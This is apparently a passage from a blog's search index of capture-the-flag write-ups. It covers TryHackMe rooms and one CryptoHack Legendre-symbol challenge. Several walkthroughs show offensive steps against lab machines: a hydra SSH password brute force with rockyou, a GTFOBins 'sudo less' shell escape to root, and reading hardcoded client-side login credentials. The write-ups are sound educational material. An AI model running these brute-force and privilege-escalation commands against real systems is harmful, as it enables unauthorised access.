reverse shell and continue enumeration.If we enumerate much we discover /home/rick/Let’s cat the file in the rick’s home directory and decode ituse └─$ echo &quot;MSBqZXJyeSB0ZWFoCg==&quot; | base64 -d[second flag]Output of sudo -l : Matching Defaults entries for www-data on ip-10-10-164-56.eu-west-1.compute.internal: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on ip-10-10-164-56.eu-west-1.compute.internal: (ALL) NOPASSWD: ALLSo, we can run ANY command as root ?Perfect !By adding sudo before each command we can access all files on the system…The third flag┌──(kali㉿kali)-[~]└─$ sudo ls -l /root/3rd.txtsnap As before, we use base64 to read files┌──(kali㉿kali)-[~]└─$ sudo base64 -d 3rd.txt[third flag]Done !" }, { "title": "THM - Brooklyn Nine Nine", "url": "/posts/THM-nine-nine/", "categories": "Try Hack Me", "tags": "CTF, THM, sudo, easy", "date": "2022-06-01 00:00:00 +0000", "snippet": "Information GatheringNmapWe begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 11:38 EDTNmap scan report for 10.10.112.101Host is up (0.079s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.8.80.139| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-r--r-- 1 0 0 119 May 17 2020 note_to_jake.txt22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)| 256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)|_ 256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Site doesn&#39;t have a title (text/html).Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 13.92 secondsHere, we notice that ports 21,22,80 are open.Thanks to Nmap, we find that port 22 with anonymous login is enabled.FTP Anonymous loginLet’s connect anonymously to the server. Use “anonymous” as user and leave the password field blank.Connected to 10.10.112.101.220 (vsFTPd 3.0.3)Name (10.10.112.101:kali): anonymous331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&amp;gt; dir229 Entering Extended Passive Mode (|||59205|)150 Here comes the directory listing.-rw-r--r-- 1 0 0 119 May 17 2020 note_to_jake.txt226 Directory send OK.A “note_to_jake.txt” is here.Inside we found :From Amy,Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nineLet’s put aside the usernames “jake” and “amy”.Maybe we can bruteforce Jake’s password later.Port 80On the main page we just have a picture. We can go further with dirsearch, we may be lucky to find hidden directories. dirsearch -u http://10.10.112.101 _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927Output File: /home/kali/.dirsearch/reports/10.10.112.101/_22-05-31_11-56-16.txtError Log: /home/kali/.dirsearch/logs/errors-22-05-31_11-56-16.logTarget: http://10.10.112.101/[11:57:00] 200 - 718B - /index.html [11:57:22] 403 - 278B - /server-status/ [11:57:23] 403 - 278B - /server-status Bad luck ! We do not find anything special.We know that Jake has a weak password, maybe we can just try to bruteforce his ssh password.Is Jake password really weak ?Let’s use hydra to bruteforce jake’s password.$ hydra -s 22 -l jake -P /usr/share/wordlists/rockyou.txt -t 16 10.10.112.101 sshHydra v9.2 (c) 2021 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-31 12:07:17[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task[DATA] attacking ssh://10.10.112.101:22/[22][ssh] host: 10.10.112.101 login: jake password: [REDACTED]Done ! Jack has a really weak password…PrivescMoove to SSH &amp;amp; User flag (also root)└─$ ssh jake@10.10.112.101 The authenticity of host &#39;10.10.112.101 (10.10.112.101)&#39; can&#39;t be established.ED25519 key fingerprint is SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU.This host key is known by the following other names/addresses: ~/.ssh/known_hosts:18: [hashed name]Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#39;10.10.112.101&#39; (ED25519) to the list of known hosts.jake@10.10.112.101&#39;s password: Last login: Tue May 26 08:56:58 2020jake@brookly_nine_nine:~$Connected !The 4 first things to try for privilege escalation in my opinion: Sudo -l Crontab SUID Write accessThe sudo -l output is pretty useful.jake@brookly_nine_nine:~$ sudo -lMatching Defaults entries for jake on brookly_nine_nine: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser jake may run the following commands on brookly_nine_nine: (ALL) NOPASSWD: /usr/bin/lessWe can run less as any user without any password…When i want to exploit binaries i moove to https://gtfobins.github.io/gtfobins/less/Written in the Sudo section :sudo less /etc/profile!/bin/shSo we can open shell with less.By executing these commands we get root and we can have flags:jake@brookly_nine_nine:~$ sudo less /etc/profile# whoamiroot# cat /home/holt/user.txt &amp;amp;&amp;amp; cat /root/root.txt[REDACTED]-- Creator : Fsociety2006 --Congratulations in rooting Brooklyn Nine NineHere is the flag: [REDACTED]Enjoy!!ConclusionVery easy one but quite interesting :)" }, { "title": "THM - CyberHeroes ", "url": "/posts/THM-CyberHeroes/", "categories": "Try Hack Me", "tags": "CTF, THM, easy, javascript", "date": "2022-06-01 00:00:00 +0000", "snippet": "EnumerationNmapLet’s start by using nmap to see which ports are open└─$ nmap -A 10.10.125.139Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 03:21 EDTNmap scan report for 10.10.125.139Host is up (0.91s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 ac:fb:4b:1a:17:50:8a:b8:81:14:77:5c:15:aa:6b:41 (RSA)| 256 cb:52:a6:0a:50:5c:01:d9:09:16:d9:81:fe:96:27:bf (ECDSA)|_ 256 f1:c9:a2:ff:5a:f0:d6:9f:f0:ba:3d:69:7c:e1:4e:23 (ED25519)80/tcp open http Apache httpd 2.4.48 ((Ubuntu))|_http-title: CyberHeros : Index|_http-server-header: Apache/2.4.48 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 9.22 secondsPort 80└─$ dirsearch -u http://10.10.125.139 _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927Output File: /home/kali/.dirsearch/reports/10.10.125.139/_22-06-07_03-23-36.txtError Log: /home/kali/.dirsearch/logs/errors-22-06-07_03-23-36.logTarget: http://10.10.125.139/ [03:23:54] 200 - 1KB - /assets/ [03:23:54] 301 - 315B - /assets -&amp;gt; http://10.10.125.139/assets/ [03:23:56] 200 - 3KB - /changelog.txt [03:24:06] 200 - 6KB - /index.html [03:24:09] 200 - 6KB - /login.html Task completedNothing here :/In the source code of the login page we have this &amp;lt;main id=&quot;main&quot;&amp;gt; &amp;lt;section id=&quot;hero&quot; class=&quot;d-flex flex-column justify-content-center align-items-center&quot;&amp;gt; &amp;lt;div class=&quot;hero-container&quot;&amp;gt; &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; &amp;lt;div class=&quot;&quot;&amp;gt; &amp;lt;div class=&quot;form&quot;&amp;gt; &amp;lt;h4 id=&quot;flag&quot;&amp;gt;&amp;lt;/h4&amp;gt; &amp;lt;form id=&quot;todel&quot;class=&quot;&quot;&amp;gt; &amp;lt;div class=&quot;section-title&quot;&amp;gt; &amp;lt;h2&amp;gt;Login&amp;lt;/h2&amp;gt; &amp;lt;h4&amp;gt;Show your hacking skills and login to became a CyberHero ! :D&amp;lt;/h4&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;input type=&quot;text&quot; id=&quot;uname&quot; placeholder=&quot;username&quot;/&amp;gt; &amp;lt;input type=&quot;password&quot; id=&quot;pass&quot; placeholder=&quot;password&quot;/&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;button id=&quot;rm&quot; onclick=&quot;authenticate()&quot;&amp;gt;login&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/section&amp;gt; &amp;lt;/main&amp;gt; &amp;lt;script&amp;gt; function authenticate() { a = document.getElementById(&#39;uname&#39;) b = document.getElementById(&#39;pass&#39;) const RevereString = str =&amp;gt; [...str].reverse().join(&#39;&#39;); if (a.value==&quot;h3ck3rBoi&quot; &amp;amp; b.value==RevereString(&quot;54321@terceSrepuS&quot;)) { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 &amp;amp;&amp;amp; this.status == 200) { document.getElementById(&quot;flag&quot;).innerHTML = this.responseText ; document.getElementById(&quot;todel&quot;).innerHTML = &quot;&quot;; document.getElementById(&quot;rm&quot;).remove() ; } }; xhttp.open(&quot;GET&quot;, &quot;RandomLo0o0o0o0o0o0o0o0o0o0gpath12345_Flag_&quot;+a.value+&quot;_&quot;+b.value+&quot;.txt&quot;, true); xhttp.send(); } else { alert(&quot;Incorrect Password, try again.. you got this hacker !&quot;) } } &amp;lt;/script&amp;gt;When we press the login button, the function authenticate() is launched.Take a look at this function.function authenticate() { a = document.getElementById(&#39;uname&#39;) b = document.getElementById(&#39;pass&#39;) const RevereString = str =&amp;gt; [...str].reverse().join(&#39;&#39;); if (a.value==&quot;h3ck3rBoi&quot; &amp;amp; b.value==RevereString(&quot;54321@terceSrepuS&quot;)) { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 &amp;amp;&amp;amp; this.status == 200) { document.getElementById(&quot;flag&quot;).innerHTML = this.responseText ; document.getElementById(&quot;todel&quot;).innerHTML = &quot;&quot;; document.getElementById(&quot;rm&quot;).remove() ; } }; xhttp.open(&quot;GET&quot;, &quot;RandomLo0o0o0o0o0o0o0o0o0o0gpath12345_Flag_&quot;+a.value+&quot;_&quot;+b.value+&quot;.txt&quot;, true); xhttp.send(); } else { alert(&quot;Incorrect Password, try again.. you got this hacker !&quot;) } }So, the code check if the username is “h3ck3rBoi” and the password is “RevereString(“54321@terceSrepuS”)”.RevereString() is just reversing a string…If we reverse “54321@terceSrepuS” we have “SuperSecret@12345”By using “h3ck3rBoi” as username and “SuperSecret@12345” as password, we get the flagDone." }, { "title": "CryptoHack - Adrien&#39;s Signs", "url": "/posts/CRYPTOHACK-adrien-sign/", "categories": "CryptoHack", "tags": "Challenge, Legendre, crypto, math, modular math", "date": "2022-06-01 00:00:00 +0000", "snippet": "challenge link : https://cryptohack.org/courses/modular/adrien/ChallengeAdrien’s been looking at ways to encrypt his messages with the help of symbols and minus signs. Can you find a way to recover the flag?SolutionHere is the given source code :from random import randinta = 288260533169915p = 1007621497415251FLAG = b&#39;crypto{????????????????????}&#39;def encrypt_flag(flag): ciphertext = [] plaintext = &#39;&#39;.join([bin(i)[2:].zfill(8) for i in flag]) for b in plaintext: e = randint(1, p) n = pow(a, e, p) if b == &#39;1&#39;: ciphertext.append(n) else: n = -n % p ciphertext.append(n) return ciphertextprint(encrypt_flag(FLAG))Before succeeding in deciphering the code it is necessary to understand how it is encrypted.First, our text is converted to binary. For each digit (0 or 1), the algorithm compute n=a exponent e (e=random integer where 1&amp;lt;e&amp;lt;p).If the selected digit is a 1 the algorithm add n to an array and add n=-n%p otherwise (so if the selected digit is 0).The challenge is named “Adrien’s sign” a reference to the Legendre symbol because Legendre’s firstname is Adrien-Marie and previous exercices was about Legendre symbol.Legendre symbol formula :Compute legendre symbol for a mod p we have➜ ~ python3 Python 3.8.10 (default, Mar 15 2022, 12:22:08) [GCC 9.4.0] on linuxType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&amp;gt;&amp;gt;&amp;gt; a=288260533169915&amp;gt;&amp;gt;&amp;gt; p=1007621497415251&amp;gt;&amp;gt;&amp;gt; pow(a,(p-1)//2,p)1&amp;gt;&amp;gt;&amp;gt; Thanks to Legendre, a is a quadratic-residue mod p.Remember, if the digit is ‘1’, we directly add our n to the array. If a number is a quadratic-residue, all the number ae will be also a quadratic-residue.We can check for each integers in our array the Legendre symbol of this number. If the result is 1, it’s was a ‘1’ before encryption, otherwise it was a ‘0’.Let’s do itarray=[67594220461269, 501237540280788, 718316769824518, 296304224247167, 48290626940198, 30829701196032, 521453693392074, 840985324383794, 770420008897119, 745131486581197, 729163531979577, 334563813238599, 289746215495432, 538664937794468, 894085795317163, 983410189487558, 863330928724430, 996272871140947, 352175210511707, 306237700811584, 631393408838583, 589243747914057, 538776819034934, 365364592128161, 454970171810424, 986711310037393, 657756453404881, 388329936724352, 90991447679370, 714742162831112, 62293519842555, 653941126489711, 448552658212336, 970169071154259, 339472870407614, 406225588145372, 205721593331090, 926225022409823, 904451547059845, 789074084078342, 886420071481685, 796827329208633, 433047156347276, 21271315846750, 719248860593631, 534059295222748, 879864647580512, 918055794962142, 635545050939893, 319549343320339, 93008646178282, 926080110625306, 385476640825005, 483740420173050, 866208659796189, 883359067574584, 913405110264883, 898864873510337, 208598541987988, 23412800024088, 911541450703474, 57446699305445, 513296484586451, 180356843554043, 756391301483653, 823695939808936, 452898981558365, 383286682802447, 381394258915860, 385482809649632, 357950424436020, 212891024562585, 906036654538589, 706766032862393, 500658491083279, 134746243085697, 240386541491998, 850341345692155, 826490944132718, 329513332018620, 41046816597282, 396581286424992, 488863267297267, 92023040998362, 529684488438507, 925328511390026, 524897846090435, 413156582909097, 840524616502482, 325719016994120, 402494835113608, 145033960690364, 43932113323388, 683561775499473, 434510534220939, 92584300328516, 763767269974656, 289837041593468, 11468527450938, 628247946152943, 8844724571683, 813851806959975, 72001988637120, 875394575395153, 70667866716476, 75304931994100, 226809172374264, 767059176444181, 45462007920789, 472607315695803, 325973946551448, 64200767729194, 534886246409921, 950408390792175, 492288777130394, 226746605380806, 944479111810431, 776057001143579, 658971626589122, 231918349590349, 699710172246548, 122457405264610, 643115611310737, 999072890586878, 203230862786955, 348112034218733, 240143417330886, 927148962961842, 661569511006072, 190334725550806, 763365444730995, 516228913786395, 846501182194443, 741210200995504, 511935604454925, 687689993302203, 631038090127480, 961606522916414, 138550017953034, 932105540686829, 215285284639233, 772628158955819, 496858298527292, 730971468815108, 896733219370353, 967083685727881, 607660822695530, 650953466617730, 133773994258132, 623283311953090, 436380836970128, 237114930094468, 115451711811481, 674593269112948, 140400921371770, 659335660634071, 536749311958781, 854645598266824, 303305169095255, 91430489108219, 573739385205188, 400604977158702, 728593782212529, 807432219147040, 893541884126828, 183964371201281, 422680633277230, 218817645778789, 313025293025224, 657253930848472, 747562211812373, 83456701182914, 470417289614736, 641146659305859, 468130225316006, 46960547227850, 875638267674897, 662661765336441, 186533085001285, 743250648436106, 451414956181714, 527954145201673, 922589993405001, 242119479617901, 865476357142231, 988987578447349, 430198555146088, 477890180119931, 844464003254807, 503374203275928, 775374254241792, 346653210679737, 789242808338116, 48503976498612, 604300186163323, 475930096252359, 860836853339514, 994513691290102, 591343659366796, 944852018048514, 82396968629164, 152776642436549, 916070996204621, 305574094667054, 981194179562189, 126174175810273, 55636640522694, 44670495393401, 74724541586529, 988608465654705, 870533906709633, 374564052429787, 486493568142979, 469485372072295, 221153171135022, 289713227465073, 952450431038075, 107298466441025, 938262809228861, 253919870663003, 835790485199226, 655456538877798, 595464842927075, 191621819564547]p=1007621497415251def isQuadratic(_int,p): return True if pow(_int,(p-1)//2,p)==1 else Falsedef to_bin(array,p): final=b&#39;&#39; for i in array: if isQuadratic(i,p): final+=b&#39;1&#39; else: final+=b&#39;0&#39; return finalprint(to_bin(array,p))output: b&#39;01100011011100100111100101110000011101000110111101111011011100000011010001110100011101000110010101110010011011100111001101011111001100010110111001011111011100100110010100110101011010010110010001110101001100110111001101111101&#39;Now, we have to convert this to text :n = int(res, 2)print(n.to_bytes((n.bit_length() + 7) // 8, &#39;big&#39;).decode()) #From stackoverflowoutput : crypto{FLAG}" } ]
